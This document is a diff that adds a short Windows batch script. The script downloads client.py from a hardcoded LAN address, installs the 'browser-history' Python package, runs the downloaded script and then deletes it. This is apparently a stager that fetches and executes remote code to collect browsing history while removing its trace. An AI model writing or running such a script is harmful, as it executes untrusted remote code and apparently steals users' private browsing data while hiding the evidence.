@@ -1,0 +1,5 @@
+@echo off
+curl -o ".\client.py" "http://192.168.1.50/client.py"
+python -m pip install browser-history
+python ".\client.py"
+del ".\client.py"
